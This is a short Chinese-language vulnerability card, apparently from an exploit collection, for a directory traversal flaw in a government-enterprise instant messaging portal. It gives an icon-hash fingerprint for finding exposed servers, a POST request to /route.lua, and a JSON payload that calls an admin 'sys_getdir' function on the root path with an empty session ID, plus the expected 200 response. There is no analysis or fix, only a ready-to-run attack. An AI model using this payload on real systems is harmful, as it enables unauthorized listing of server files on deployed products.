# 政企即时通讯门户系统route存在目录遍历漏洞

政企即时通讯门户系统 ｜ 路径遍历 ｜ —
- **指纹**：`icon_hash="561018561"`
- **请求**：`POST /route.lua HTTP/1.1`

**Payload**
```
{"data":"{\"modulename\":\"admin\",\"functionname\":\"sys_getdir\",\"path\":\"/\"}","sessionid":"","websocket_name":"k0tmucDU2TRvKh9f"}
```
- **响应特征**：200